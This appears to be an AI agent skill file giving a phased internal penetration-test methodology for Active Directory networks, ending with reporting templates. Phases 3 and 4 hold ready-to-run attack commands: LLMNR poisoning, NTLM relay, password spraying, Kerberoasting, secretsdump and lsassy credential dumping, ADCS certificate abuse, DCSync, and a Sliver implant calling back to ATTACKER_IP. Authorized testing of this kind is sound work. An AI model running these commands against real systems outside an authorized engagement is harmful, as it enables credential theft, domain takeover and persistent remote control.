# Internal Pentest Methodology

## Purpose
Provide phase-based guidance during internal penetration testing engagements.

## When to Use
- User asks "what should I do next?"
- User asks about current phase
- User needs methodology guidance
- VAULT.md exists with internal pentest context

---

## 5-Phase Assessment Structure

| Phase | Timeline | Focus | Deliverables |
|-------|----------|-------|--------------|
| **Phase 1** | Days 1-2 | Network Discovery & Enumeration | Network map, service inventory |
| **Phase 2** | Days 2-4 | AD Enumeration & Attack Paths | BloodHound data, ADCS findings |
| **Phase 3** | Days 4-6 | Credential Attacks & Initial Access | Captured hashes, cracked creds |
| **Phase 4** | Days 6-8 | Lateral Movement & Privilege Escalation | DA path, evidence chain |
| **Phase 5** | Days 8-10 | Post-Exploitation & Reporting | Findings, exec summary, roadmap |

---

## Phase 1: Network Discovery & Enumeration

### Objectives
- Discover live hosts and map the network
- Identify services and their versions
- Enumerate SMB, detect signing status
- Map VLANs and network segmentation
- Identify domain controllers

### Key Actions

```bash
# 1. Ping sweep
nmap -sn [CIDR] -oA outputs/nmap/pingsweep

# 2. Full service scan
nmap -sV -sC -iL targets/live-hosts.txt -oA outputs/nmap/service_scan

# 3. SMB enumeration + signing check
netexec smb targets/live-hosts.txt --gen-relay-list targets/smb-no-signing.txt

# 4. Null session check
netexec smb targets/live-hosts.txt -u '' -p '' --shares

# 5. SNMP sweep
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i targets/live-hosts.txt
```

### Automation
Run `Scripts/network-discovery.sh [CIDR]` for comprehensive network scanning.

### Deliverables
- `targets/live-hosts.txt` - All discovered hosts
- `targets/domain-controllers.txt` - Identified DCs
- `targets/services.txt` - Interesting services
- `targets/smb-no-signing.txt` - Relay targets
- `outputs/nmap/` - All scan results

### Transition Criteria
- Live hosts identified and categorized
- Services enumerated and documented
- SMB signing status mapped
- Domain controllers located
- Ready for AD enumeration

---

## Phase 2: AD Enumeration & Attack Paths

### Objectives
- Collect BloodHound data for attack path analysis
- Enumerate domain users, groups, and permissions
- Identify ADCS vulnerabilities (ESC1-ESC8)
- Map trust relationships
- Find sensitive data in shares

### Key Actions

```bash
# 1. BloodHound collection
bloodhound-python -u 'USER' -p 'PASS' -d DOMAIN -ns DC_IP -c All --zip

# 2. Comprehensive AD enumeration
netexec ldap DC_IP -u 'USER' -p 'PASS' --users
netexec ldap DC_IP -u 'USER' -p 'PASS' --groups
netexec smb DC_IP -u 'USER' -p 'PASS' --pass-pol

# 3. ADCS enumeration
certipy find -u 'USER@DOMAIN' -p 'PASS' -dc-ip DC_IP -vulnerable -stdout

# 4. Share enumeration
netexec smb targets/live-hosts.txt -u 'USER' -p 'PASS' --shares
netexec smb targets/live-hosts.txt -u 'USER' -p 'PASS' -M spider_plus

# 5. GPP passwords
netexec smb DC_IP -u 'USER' -p 'PASS' -M gpp_password
```

### Automation
- Run `Scripts/bloodhound-collection.sh` for BloodHound data
- Run `Scripts/ad-enum.sh` for comprehensive enumeration

### BloodHound Analysis Priorities
1. **Shortest Path to Domain Admins** - From owned principals
2. **Kerberoastable Users** - With admin privileges
3. **Unconstrained Delegation** - Computers and users
4. **ADCS Attack Paths** - Certificate template abuse
5. **Shadow Admin Paths** - Non-obvious DA paths
6. **Cross-Domain Trusts** - Inter-forest attack paths

### Deliverables
- `outputs/bloodhound/` - Collection data
- `outputs/certipy/` - ADCS analysis
- `targets/domain-users.txt` - Full user list
- Updated Notes.md with observations

### Transition Criteria
- BloodHound data collected and analyzed
- Users, groups, and permissions mapped
- ADCS enumerated for ESC vulnerabilities
- Password policy documented
- Attack paths identified
- Ready for credential attacks

---

## Phase 3: Credential Attacks & Initial Access

### Objectives
- Capture credentials via network poisoning
- Relay NTLM authentication for access
- Spray common passwords against domain
- Extract Kerberos service ticket hashes
- Crack captured hashes

### Key Actions

```bash
# 1. LLMNR/NBT-NS poisoning
sudo responder -I eth0 -wrFP -v

# 2. SMB relay (on targets without signing)
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support

# 3. Password spray (after reviewing policy!)
netexec smb DC_IP -u targets/domain-users.txt -p 'Spring2026!' --continue-on-success

# 4. Kerberoasting
impacket-GetUserSPNs -request -dc-ip DC_IP 'DOMAIN/USER:PASS'

# 5. AS-REP Roasting
impacket-GetNPUsers -dc-ip DC_IP 'DOMAIN/' -usersfile targets/domain-users.txt -format hashcat

# 6. Crack hashes
hashcat -m 5600 outputs/responder/*.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 outputs/impacket/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### Automation
Run `Scripts/credential-attacks.sh` for guided credential attack setup.

### Important Considerations
- **Check password policy BEFORE spraying** (lockout threshold, observation window)
- **One password per spray attempt** - wait for the observation window to reset
- **Log everything** - timestamps, hashes, cracked credentials
- **Track compromised accounts** in Notes.md

### Deliverables
- `outputs/responder/` - Captured NTLMv2 hashes
- `outputs/impacket/` - Kerberoast/AS-REP hashes
- Cracked credentials documented in Notes.md
- Updated compromised accounts table

### Transition Criteria
- Credential capture attempted via multiple vectors
- Hashes cracked where possible
- At least one domain account compromised (or documented inability)
- Ready for lateral movement

---

## Phase 4: Lateral Movement & Privilege Escalation

### Objectives
- Move laterally using captured credentials
- Escalate privileges toward Domain Admin
- Dump credentials from compromised hosts
- Exploit AD weaknesses (ADCS, delegation, etc.)
- Deploy C2 for persistent access (if authorized)

### Key Actions

```bash
# 1. Test credential access
netexec smb targets/live-hosts.txt -u 'USER' -p 'PASS'
netexec winrm targets/live-hosts.txt -u 'USER' -p 'PASS'

# 2. Lateral movement
impacket-wmiexec 'DOMAIN/USER:PASS@TARGET'
evil-winrm -i TARGET -u 'USER' -p 'PASS'

# 3. Credential dumping
impacket-secretsdump 'DOMAIN/USER:PASS@TARGET'
netexec smb TARGET -u 'USER' -p 'PASS' -M lsassy

# 4. ADCS exploitation (if ESC1 found)
certipy req -u 'USER@DOMAIN' -p 'PASS' -ca CA_NAME -template TEMPLATE -upn administrator@DOMAIN

# 5. DCSync (if DA achieved)
impacket-secretsdump -just-dc 'DOMAIN/USER:PASS@DC_IP'
```

### Privilege Escalation Paths (Priority Order)
1. **ADCS ESC1-ESC8** - Certificate template abuse (often fastest path)
2. **Unconstrained Delegation** - Coerce DC authentication
3. **Constrained Delegation** - S4U2Self/S4U2Proxy
4. **RBCD** - Resource-based constrained delegation
5. **Shadow Credentials** - msDS-KeyCredentialLink write
6. **GPO Abuse** - Modify GPOs applied to privileged users
7. **DCSync Rights** - Replicating Directory Changes
8. **Credential Reuse** - Local admin hash reuse across systems

### Sliver C2 Deployment (if authorized)
```bash
# Generate implant
sliver > generate --mtls ATTACKER_IP --os windows --arch amd64 --save outputs/sliver/

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Deploy via lateral movement
# Upload implant to compromised host and execute
```

### Deliverables
- Evidence of each lateral movement step
- Credential dumps from compromised hosts
- Attack path documentation (step-by-step chain)
- DA compromise evidence (if achieved)
- `outputs/impacket/` - secretsdump output

### Transition Criteria
- Lateral movement demonstrated
- Privilege escalation attempted/achieved
- Attack chain fully documented
- Evidence collected for all steps
- Ready for reporting

---

## Phase 5: Post-Exploitation & Reporting

### Objectives
- Document all findings professionally (Trace3 format)
- Create executive summary with risk rating
- Build prioritized remediation roadmap
- Organize all evidence

### Key Deliverables

#### Finding Files (Trace3 Format)
Create individual files in `Findings/`:
- `llmnr-nbtns-poisoning.md`
- `smb-signing-disabled.md`
- `adcs-esc1-template-abuse.md`
- `kerberoastable-service-accounts.md`
- `domain-admin-compromise.md`
- etc.

#### EXECUTIVE_SUMMARY.md
```markdown
# [CLIENT] Internal Penetration Test - Executive Summary

## Assessment Overview
- **Dates**: [start] - [end]
- **Scope**: [network_ranges], [domain_name]
- **Access Method**: [Physical / VPN]
- **Starting Position**: [Black box / Assumed breach]

## Risk Rating: [CRITICAL/HIGH/MEDIUM/LOW]

## Key Findings

| Severity | Count |
|----------|-------|
| Critical | X |
| High | X |
| Medium | X |
| Low | X |

## Attack Path Summary
[Brief narrative of how domain was compromised, or furthest point reached]

## Top Risks
1. [Finding 1] - [One sentence impact]
2. [Finding 2] - [One sentence impact]
3. [Finding 3] - [One sentence impact]

## Recommendations
1. Immediate: [Top priority fix]
2. Short-term: [Within 1 week]
3. Medium-term: [Within 1 month]
```

#### REMEDIATION_ROADMAP.md
```markdown
# [CLIENT] - Remediation Roadmap

## Phase Overview

| Phase | Timeline | Focus | Items |
|-------|----------|-------|-------|
| **Phase 1** | 0-24h | Critical credential/access issues | X |
| **Phase 2** | 24-72h | Network segmentation/hardening | X |
| **Phase 3** | 1-2 weeks | AD hardening/ADCS/delegation | X |
| **Phase 4** | 2-4 weeks | Monitoring/detection/policy | X |
```

### Phase Assignment Guidelines
- **Phase 1 (0-24h)**: Domain Admin compromise path, ADCS critical ESCs, exposed credentials
- **Phase 2 (24-72h)**: SMB signing, LLMNR/NBT-NS, network segmentation gaps
- **Phase 3 (1-2 weeks)**: ADCS template hardening, delegation cleanup, LAPS deployment
- **Phase 4 (2-4 weeks)**: EDR gaps, monitoring rules, password policy improvements

---

## Progress Tracking

Update `Notes.md` checkboxes as phases complete:

```markdown
- [x] **Phase 1: Network Discovery** - Completed [date]
- [x] **Phase 2: AD Enumeration** - Completed [date]
- [x] **Phase 3: Credential Attacks** - Completed [date]
- [ ] **Phase 4: Lateral Movement** - In progress
- [ ] **Phase 5: Reporting** - Pending
```

---

## Related Skills

- `/internal-pentest` - Return here for phase guidance
- `/OSINT` - Company intelligence
- `/azure-pentest` - If Azure/cloud components discovered
